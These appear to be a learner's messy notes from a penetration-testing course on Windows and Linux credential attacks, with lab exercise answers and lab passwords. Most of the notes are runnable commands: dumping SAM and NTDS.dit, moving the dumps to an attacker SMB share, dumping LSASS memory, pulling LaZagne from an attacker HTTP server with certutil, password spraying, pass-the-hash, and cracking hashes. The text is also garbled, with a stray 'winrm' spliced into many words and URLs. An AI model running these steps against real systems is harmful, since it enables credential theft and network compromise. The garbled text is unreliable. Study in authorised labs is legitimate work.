HKLM\SAM	Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.
HKLM\SYSTEM	Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.
HKLM\SECURITY	Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.
-we can backup these hives using the reg.exe utility
\\Using reg.exe to copy registry hives

C>reg.exe save hklm\sam C:\sam.save
C>reg.exe save hklm\system C:\system.save
C>reg.exe save hklm\security C:\security.save
“Local hashes: relevant hives — HKLM\SAM and HKLM\SYSTEM; HKLM\SECURITY may contain cached domain credentials on joined hosts.”
we'll use Impacket's smbserver in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.
https://github.com/fortra/impacket/blob/master/examples/smbserver.py
\\Creating a shre with smbserver
smbserver.py -smb2support, secify a namse for share (Eg: CompData)
The -smb2support flag ensures compatibility with newer versions of SMB
$sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
\\Moving hive copies to share

C>move sam.save \\10.10.15.16\CompData
C>move security.save \\10.10.15.16\CompData
C>move system.save \\10.10.15.16\CompData  -> confirm succefull moving ls

\\Dumping hashes with secretsdump

“Tool check: confirm presence of Impacket components in the lab distribution (if using for authorized testing).”
“Ensure offensive tool usage is limited to isolated, approved environments.”
$locate secretsdumpwinrm
Using secretsdump is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.
$python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Output: SAM hashes + SECURITY (cached logons, DPAPI keys) → bootkey retrieved first → bootkey needed to decrypt SAM.”
Moving on, notice the following line:
Dumping local SAM hashes (uid:rid:lmhash:nthash)
-NT is the common hash on modern Windows; LM shows up on older systems and is easier to break. Keep a record of which user goes with which hash and handle everything in a safe lab.
\\Cracking hashes with Hashcat
$sudo vim hashestocrack.txt
\\Runing the Hashcat against NT hashes

 the -m option to specify hash type 1000, which corresponds to NT hashes (also known as NTLM-based hashes
 https://hashcat.net/wiki/doku.php?id=example_hashes
$sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
we can account to creds stuffing, We will benefit from it anytime we encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.
-Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are documented within the MITRE ATT&CK framework.
https://attack.mitre.org/techniques/T1003/002/

\\DCC2 hashes

As mentioned previously, hklm\security contains cached domain logon information, specifically in the form of DCC2 hashes
These are local, hashed copies of network credential hashes. An example is:
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques
 like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is 2100.
 $hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
 -he exact numbers will depend heavily on the hardware available, of course, but the takeaway is that strong passwords are often uncrackable within typical penetration testing timeframes.
 \\DPAPI Data Protection API
 “DPAPI — API mã hóa theo người dùng của Windows; dùng bởi trình duyệt, Credential Manager, VPN/SSO, một số add-in Office. Khóa máy/người dùng quan trọng cho phân tích trong lab được phép.”
 https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection

Applications	Use of DPAPI
Internet Explorer	Password form auto-completion data (username and password for saved sites).
Google Chrome	Password form auto-completion data (username and password for saved sites).
Outlook	Passwords for email accounts.
Remote Desktop Connection	Saved credentials for connections to remote machines.
Credential Manager	Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.

-In addition to the DCC2 hashes, we previously saw that the machine and user keys for DPAPI were also dumped from hklm\security

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz, or remotely with DonPAPI.
C>minikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

\\Remote dumping & LSA secrets considerations
winrm
Local-admin credentials can expose LSA secrets over the network; these may include service, scheduled-task, or application passwords
\\Dumping LSA secrets

$netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

\\Dumping SAM remotely
Similarly, we can use netexec to dump hashes from the SAM database remotely.
$netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

Bob" and password "HTB_@cademy_stdnt!"
<test>Where is the SAM database located in the Windows registry? (Format: ****\***)

<test> Apply the concepts taught in this section to obtain the password to the ITbackdoor
 user account on the target. Submit the clear-text password as the answer.
$xfreerdp /v: /u:bob /p"HTB_@cademy_stdnt!
C:>reg.exe save hklm\sam C:\sam.save
C:>reg.exe save hklm\system C:\system.save
C:>reg.exe save hklm\security C:\security.save

udo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-XXXXXX/Documents

C>move sam.save \\10.10.15.16\\CompData
C:>move security.save \\10.10.15.16\CompData
C:>move system.save \\10.10.15.16\CompData


python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
$ sudo vim hashestocrack.txt </alter> cat << EOF > samhashes.txt <sambd>
cut -d ':' -f 4 samhashes.txt > nthashes.txt  cut in order to extract only the NT hashes

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

 <Test>Dump the LSA secrets on the target and discover the credentials stored. Submit the username 
 and password as the answer. (Format: username:password, Case-Sensitive)

netexec smb <ip> --local-auth -u bob -p HTB_@cadwinrmemy_stdnt! --lsa

\\\\\\\\============================================
Attacking LSASS
=local security Authority Subsystem Service (LSASS) is core window process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memmory
-upon initial logon LSASS will:
    +cache creds locally in memmory
    +create access tokens
    +Enforce security polocies
    +Write to Windows security log
\\Dumping LSASS process memmory
>create a copy of LSASS process memory via the generation of a memory dump.> create dump file > extract creds offline using atk host
\\Task Manager method
1> open TASKMGRS > process tab > rightclick on Local security Authority Process > Create dump file
-> a file called lsass.DMP is created and saved in %temp% > transfer this to atk host

\\Rundll32.exe & Comsvcs.dll method
-before issuing the command to create the dump file, we must determine what process ID (PID)
is assigned to lsass.exe 
\\Finding LSASS's PID in CMD
$tasklist /svc to find lsass.exe and its process ID

\\Finding LSASS's PID in Powershell
ps>Get-Process lsass

\\Creating a dump file using Powershell
with an elevated PowerShell session, we can issue the following command to create a dump file
PS>rundll32   >  comsvcs.dll, MiniDump 672 C:\lsass.dmp full
running rundll32.exe to call exported funcs of comsvcs.dll also calls the MoniDumpWriteDump (MiniDump) func to dump the LSASS process mem to a specified directory (C:\lsass.dmp.)
NOTE: AV will block this

\\Using Pypykatz to extract credentials
this is an implementation of Mimikatz write in py 
When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.

\\Running Pypykatz
The command runs pypykatz to parse secrets from an LSASS memory minidump. It calls the lsa module, points to the minidump file on the host, and pypykatz extracts and displays any credentials and related artifacts found.
$pypykatz lsa minidump /home/peter/Documents/lsass.dmp
lsass is a subsystem of the Local Security Authority

\\Msv 
MSV is an authentication package in windows that LSA calls on the validate login attempts against the SAM db, Pypykatz extracted the SID, Username, Domain,
and even the NT & SHA1 pwd hashes associated with the bob user account login session stored in LSASS process memory, 

\\WDIGEST
is an older authentication protocol enabled by default in Window XP-window8 and windows server 2003 0 window server 2012.
-LSASS caches creds used by WDIGEST in clear-texwinrmt, this means if we find ourselves targeting a Window system with WDIGEST enabled,we will most likely see a password in clear-text.
-Modern Windows OS have WDIGEST disabled by default. Additionally it is essential to note that MS releasee a security update for systems affected by this issue with WDIG
https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997

\\Kerberos
is a network authenticate protocol used by AD in Windows Domain Envi, Domain user acc are granted tickets upon authentication with AD>
-this ticket is used to allow the user to access shared resource on the network that they have been granted access to without needing to type their creds each time.
-LSASS caches passwords, ekey, tickets, and pins associated with kerberos. 
-it is possible to extract from LSASS process in Mem and use them to access other systems joined to the same domain

\\DPAPI
Mimikatz and Pypykatz can extract the DPAPI masterkey for logged-on users whose data is present in LSASS process memory. these masterkeys can then be used to decrypy the secret associated with each of the app using DPAPI and result in capturing of creds for various acc, DPAPI atk techniques are covered in greater detail in the Window Privileges escalation module

\\Cracking the NT Hash with Hashcat
$sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

10.129.202.149
<Test> What is the name of the executable file associated with the Local Security Authority Process?
lsass.exe
<test>Apply the concepts taught in this section to obtain the password to the Vendor user
 account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
 $xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!
 $taskmgr progress -> LSAP create dump file  A file called lsass.DMP is created and saved in %temp%.
 $tasklist /svc -> find for lsass.exe id  PS> Get-Process lsass -> find for ID field

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

udo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-XXXXXX/Documents

C>move sam.save \\10.10.15.16\\CompData
C:>move security.save \\10.10.15.16\CompData
C:>move system.save \\10.10.15.16\CompData

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
$pypykatz lsa minidump /home/peter/Documents/lsass.dmp
$cracking the NT hash with hashcat
$sudo hashcat -m 1000 NThash /usr/share/wordlists/rockyou/

\\\\\\\\\\\\\\=====================================
Attacking Windows Credential Managers
\\Windows Vault and Credential Manager
is build into windows sicen server 2008R2 windows 7 
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppDawinrmta\Roaming\Microsoft\Vault\
each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI, 
These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves (Virtualization-based Security).
https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs
-Microsoft often refers to the protected stores as Credential Lockers (formerly Windows Vaults). Credential Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores:
Name	Description
Web Credentials	Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.
Windows Credentials	Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.
It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.
$cmd>ruldll32 keymgr.dll,KRShowKeyMgr
\\Enumerating credentials with cmdkey
cmd>whoami  >cmdkey /list >

Key	Value
Target	The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.
Type	The kind of credential. Common types are Generic for general credentials, and Domain Password for domain user logons.
User	The user account associated with the credential.
Persistence	Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with Local machine persistence survive reboots.

The first credential in the command output above, virtualapp/didlogical, is a generic credential used by Microsoft account/Windows Live services. The random looking username is an internal account ID. This entry may be ignored for our purposes.
The second credential, Domain:interactive=SRV01\mcharles, is a domain credential associated with the user SRV01\mcharles. Interactive means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use runas to impersonate the stored user like so:
winrm
C>runas /savecred /user:SRV01\mcharles cmd

\\Extracting credentials with Mimikatz
use mimikatz to decrypt stored cred 
-in mimikatz there multiple ways to attack these cred-we can dump cred from mem by sekurlsa module
or manually decrypt cred usng the dpapi module.
C>mimikatz.exe
NOTE: some other tools which may be used to enumerate and extract stored cred included SharpDPAPI, LaZagne and DonPAPI.

<test>What is the password mcharles uses for OneDrive?
sadams totally2brow2harmon@
10.129.234.171
cmd>whoami  >cmdkey /list > 
C>runas /savecred /user:SRV01\mcharles cmd  > ruldll32 keymgr.dll,KRShowKeyMgr
>cmdkey /list
open atk host create www, cd inside it $mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
$python3 -m http.server
cmd>certutil -urlcache -split -f "http://pawnip:8000/lazage.exe" C:\Windows\Temp\lazagne.exedir
 temp> lagage.exe all
C:\Windows\system32>certutil -urlcache -split -f "http://10.10.14.176:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
cmd>C:\Windows\Temp\lazagne.exe all

\\\\\\\\\\\\\\\\\\\\\\\\=====================================
Attacking Active Directory and NTDS.dit
In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.
 there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389
 other protocols used for remote access on their edge router to a system on their internal network
 https://attack.mitre.org/techniques/T1003/003/
 \\Dictionary attacks against AD accounts using NetExec

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)
It can be rather noisy (easy to detect) to conduct these attacks over a networ
-In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization.
ex: Username convention	Practical example for Jane Jill Doe
firstinitiallastname	jdoe
firstinitialmiddleinitiallastname	jjdoe
firstnamelastname	janedoe
firstname.lastname	jane.doe
lastname.firstname	doe.jane
nickname	doedoehacksstuff
 (structure: username@domain). For example, frwinrmom the email address jdoe@inlanefreight.com, we can infer that jdoe is the username.
 A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails
  Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith
  Sometimes you can use google dorks to search for "inlanefreight.com filetype:pdf" and find some valid usernames in the PDF properties if they were generated using a graphics editor
  -->  From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.

  \\Creating a custom list of usernames

  $ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
-automated list generator
https://github.com/urbanadventurer/username-anarchy such as the Ruby-based tool to convert a list of real names into common username formats.
Once the tool has been cloned to our local attack host using Git
$ ./username-anarchy -i /home/ltnbob/names.txt 
ben
benwilliamson
\\Enumerating valid usernames with Kerbrute

Before we start guessing passwords for usernames which might not even exist, it may be worthwhile identifying the correct naming convention and confirming the validity of some usernames.
https://github.com/ropnop/kerbrute
Kerbrute can be used for brute-forcing, password spraying and username enumeration
$./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

\\Launching a brute-force attack with NetExec
Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch a brute-force attack against the target domain controller using a tool such as NetExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller
$netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlist/fasttrack.txt
NetExec is using SMB to attempt to logon as user (-u) bwilliamson using a password (-p) list containing a list of commonly used passwords (/usr/share/wordlists/fasttrack.txt)

\\Event logs from the attack
On any Windows operating system, an admin can navigate to Event Viewer and view the Security events to see the exact actions that were logged
This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.
Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

\\Capturing NTDS.dit
NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources
 NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest
 he .dit stands for directory information tree
 This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information
 this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM, SYSTEM, and SECURITY section
 
 \\Connecting to a DC with Evil-WinRM
$evil-winrm -i 10.129.201.57 -u bwilliamson -p '<passwd>'
Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

\\Checking local group membership
Once connected, we can check to see what privileges bwilliamson has. We can start with looking at the local group membership using the command:
*Evil-WinRM* PS C:\> net localgroup
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.

\\Checking user account privileges including dwinrmomain
*Evil-WinRM* PS C:\> net user bwilliamson

\\Creating shadow copy of C:
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: 
https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service
 VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. 
 VSS is used by many different backup and disaster recovery software to perform operations.
 $evil-winrm ps C:\>vssadmin CREATE SHADOW /For=C:
 
 \\Copying NTDS.dit from the VSS
 We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 Note: As was the case with SAM, the hashes stored in NTDS.dit are encrypted with a key stored in SYSTEM. In order to successfully extract the hashes, one must download both files.

 \\Transferring NTDS.dit to attack host
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

 \\Extracting hashes from NTDS.dit
 kinlingit@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

\\A faster method: Using NetExec to capture NTDS.dit
$netexec smb 10.129.201.57 -u bwilliamson -p P@55word! -M ntdsutil

\\Cracking hashes and gaining credentials
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

\\Pass the Hash (PtH) considerations
We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:
Pass the Hash (PtH) with Evil-WinRM Example
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module AD Enumeration and Attacks.

<Test>What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)
NTDS.dit
<test> Submit the NT hash associated with the Administrator user from the example output in the section reading.
$netexec smb 10.129.201.57 -u bwilliamson -p P@%%w0rd! -M ntdsutil

<test>On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)
$git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy John Marston > usernames.txt  Once the file with common username formats was generated
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x ./kerbrute
netexec smb STMIP > get domain name
./kerbrute userenum -d ILF.local --dc STMIP usernames.txt  > valid usser
./kerbrute bruteuser -d ILF.local --dc STMIP /usr/share/wordlists/fasttrack.txt jmarston
./kerbrute bruteuser -d ILF.local --dc STMIP /usr/share/wordlists/fasttrack.txt jmarston

<Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)>
$evil-winrm -i STMIP  -u jmarston -p 'P@ssword!'  > net user jmarston
vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .\NTDS.dit
cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support NTDS /home/htb-ac-XXXXXX/Documents
cmd.exe /c move .\NTDS.dit \\PWNIP\NTDS
cmd.exe /c move .\SYSTEM \\PWNIP\NTDS

impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL  > dump all hash of NTDS
sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt

\\\\\\\\\\========================================
Credential Hunting in Windows
\\Search-centric
 A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.
 What might an IT admin be doing on a day-to-day basis and which of those tasks may require credentials?
 We can use this question and consideration to winrmrefine our search to reduce the need for random guessing as much as possible.

\\Key terms to search for
Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:
Passwords
Passphrases
Keys
Username
User account
Creds
Users
Passkeys
configuration
dbcredential
dbpassword
pwd
Login
Credentials
Let's use some of these key terms to search on the IT admin's workstation.

\\Search tools >> pass
\\LaZagne
We can also take advantage of third-party tools like LaZagne to quickly discover credentials that web browsers or other installed applications may insecurely store. LaZagne is made up of modules which each target different software when looking for passwords. Some of the common modules are described in the table below:
Module	Description
browsers	Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera
chats	Extracts passwords from various chat applications including Skype
mails	Searches through mailboxes for passwords including Outlook and Thunderbird
memory	Dumps passwords from memory, targeting KeePass and LSASS
sysadmin	Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP
windows	Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more
wifi	Dumps WiFi credentials

Note: Web browsers are some of the most interesting places to search for credentials, due to the fact that many of them offer built-in credential storage. In the most popular browsers, such as Google Chrome, Microsoft Edge, and Firefox, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as firefox_decrypt and decrypt-chrome-passwords. LaZagne supports 35 different browsers on Windows.
https://github.com/unode/firefox_decrypt
https://github.com/ohyicong/decrypt-chrome-passwords
-It would be beneficial to keep a standalone copy of LaZagne on our attack host so we can quickly transfer it over to the target. LaZagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.
$c:>start LaZagne.exe all
all included module  option -vv to study what it is doing in the background

\\Findstr
We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
/S = tìm đệ quy trong thư mục con,
/I = không phân biệt hoa thường,
/M = chỉ in tên file chứa kết quả (không in nội dung dòng).

\\Additional considerations
There are thousands of tools and key terms we could use to hunt for credentials on Windows operating system
Passwords in Group Policy in the SYSVOL share
Passwords in scripts in the SYSVOL share
Password in scripts on IT shares
Passwords in web.config files on dev machines and IT shares
Password in unattend.xml
Passwords in the AD user or computer description fields
KeePass databases (if we are able to guess or crack the master password)
Found on user systems and shares
Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint

window seach password 
findstr /SIM /C:"github" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
python3 -m http.server
certutil -urlcache -split -f "http://STMIP:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
C:\Windows\Temp\lazagne.exe all

\\\\\\\\\\\\\\=========================================================
Linux Authentication Process
https://web.archive.org/web/20220622215926/http://winrmwww.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html
 Pluggable Authentication Modules (PAM). The modules responsible for this functionality, such as pam_unix.so or pam_unix2.so, are typically located in /usr/lib/x86_64-linux-gnu/security/ on Debian-based systems
 These modules manage user information, authentication, sessions, and password changes. For example, when a user changes their password using the passwd command, PAM is invoked, which takes the appropriate precautions to handle and store the information accordingly.
 The pam_unix.so module uses standardized API calls from system libraries to update account information. The primary files it reads from and writes to are /etc/passwd and /etc/shadow. PAM also includes many other service modules, such as those for LDAP, mount operations, and Kerberos authentication.

 \\Passwd file
 The /etc/passwd file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of seven fields, which store user-related data in a structured format. These fields are separated by colons (:). As such, a typical entry may look something like this:
 htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
 Field	Value
Username	htb-student
Password	x
User ID	1000
Group ID	1000
GECOS	,,,
Home directory	/home/htb-student
Default shell	/bin/bash
-The most relevant field for our purposes is the Password field, as it can contain different types of entries. In rare cases (generally on very old systems) this field may hold the actual password hash. On modern systems, however, password hashes are stored in the /etc/shadow file, which we'll examine later. Despite this, the /etc/passwd file is world-readable, giving attackers the ability to crack the passwords if hashes are stored here.
-Usually, we will find the value x in this field, indicating that the passwords are stored in a hashed form within the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to remove the password field for the root user entirely.
$ head -n 1 /etc/passwd  
>su
If the administrator has little experience with Linux (or the applications and their dependencies), they might mistakenly assign write permissions to the /etc directory and fail to correct them later.

\\Shadow file
Since reading password hash values can put the entire system at risk, the /etc/shadow file was introduced. It has a similar format to /etc/passwd but is solely responsible for password storage and management.
 It contains all password information for created users. For example, if there is no entry in the /etc/shadow file for a user listed in /etc/passwd, that user is considered invalid
 he /etc/shadow file is also only readable by users with administrative privileges. The format of this file is divided into the following nine fields:
$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
Field	Value
Username	htb-student
Password	$y$j9T$3QSBB6CbHEu...SNIP...f8Ms
Last change	18955
Min age	0
Max age	99999
Warning period	7
Inactivity period	-
Expiration date	-
Reserved field	-
  If the Password field contains a character such as ! or *, the user cannot log in using a Unix password
  However, other authentication methods—such as Kerberos or key-based authentication—can still be used
The same applies if the Password field is empty, meaning no password is required for login. This can lead to certain programs denying access to specific functions. The Password field also follows a particular format, from which we can extract additional information:
$<id>$<salt>$<hashed>

ID	Cryptographic Hash Algorithm
1	MD5
2a	Blowfish
5	SHA-256
6	SHA-512
sha1	SHA1crypt
y	Yescrypt
gy	Gost-yescrypt
7	Scrypt

\\Opasswd
  The PAM library (pam_unix.so) can prevent users from reusing old passwords. 
These previous passwords are stored in the /etc/security/opasswd file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.
$sudo cat /etc/security/opasswd
cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1

\\Cracking Linux Credentials
use a tool called unshadow, which is included with John the Ripper (JtR). It works by combining the passwd and shadow files into a single file suitable for cracking.
$sudo cp /etc/passwd /tmp/passwd.bak 
$sudo cp /etc/shadow /tmp/shadow.bak winrm
$unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowd.hashes
$hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
Note: This is the exact scenario that JtR's single crack mode was designed for.

\\Further reading
https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf
https://tldp.org/
$ unshadow passwd shadow
cat << EOF > hash.txt
sarah:\$6\$EBOM5vJAV1TPvrdP\$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash
EOF
john --single hash.txt 

\\Credential Hunting
These include, but are not limited to:

Files including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
History including logs, and command-line history
Memory including cache, and in-memory processing
Key-rings such as browser stored credentials

Enumerating all these categories will allow us to increase the probability of successfully finding out - with some ease - credentials of existing users on the system
For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.

\\Files
One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:
Configuration files
Databases
Notes
Scripts
Cronjobs
SSH keys
Usually, the configuration files are marked with the following three file extensions (.config, .conf, .cnf).
However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service
the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.

\\Searching for configuration files
There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.
$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

\\Searching for databaseswinrm
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

\\Searching for notes
